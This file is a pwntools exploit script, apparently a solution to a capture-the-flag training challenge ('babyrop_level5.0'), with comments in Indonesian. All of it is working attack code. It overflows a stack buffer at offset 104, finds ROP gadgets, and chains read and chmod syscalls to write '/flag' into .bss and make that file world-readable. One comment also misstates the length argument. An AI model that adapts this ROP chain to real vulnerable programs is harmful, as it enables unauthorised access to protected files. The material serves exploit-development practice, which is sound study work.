from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = '/challenge/babyrop_level5.0'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
#context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

p = start()

offset = 104
flag = b'/flag\x00'
bss_section = 0x00404090
flag_addr = bss_section     # Tempat menulis "/flag"
buffer_addr = bss_section + 0x20  # Buffer untuk menampung isi file


rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]   # Gadget: pop rdi; ret
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]   # Gadget: pop rsi; ret
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]   # Gadget: pop rdx; ret
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]   # Gadget: pop rax; ret
syscall = rop.find_gadget(['syscall', 'ret'])[0]   # Gadget: syscall; ret

payload = b'A'*offset

# ROP chain untuk memanggil read() untuk menulis "/flag" ke .bss
payload += p64(pop_rdi) + p64(0)               # rdi = 0 (stdin)
payload += p64(pop_rsi) + p64(flag_addr)       # rsi = alamat .bss
payload += p64(pop_rdx) + p64(6)               # rdx = 5 (panjang "/flag")
payload += p64(pop_rax) + p64(0)               # rax = 0 (syscall number untuk read)
payload += p64(syscall)                        # Panggil syscall read()

# ROP chain untuk chmod("/flag", 0777)
payload += p64(pop_rdi) + p64(flag_addr)       # rdi = alamat "/flag"
payload += p64(pop_rsi) + p64(0x1ff)           # rsi = mode 0777
payload += p64(pop_rax) + p64(90)              # rax = 90 (syscall number untuk chmod)
payload += p64(syscall)                        # Panggil syscall chmod()


# Kirim payload ke program
p.sendline(payload)

# Kirim string "/flag" ke program (stdin)
p.sendline(b'/flag\x00')

# Interaksi dengan shell
p.interactive()
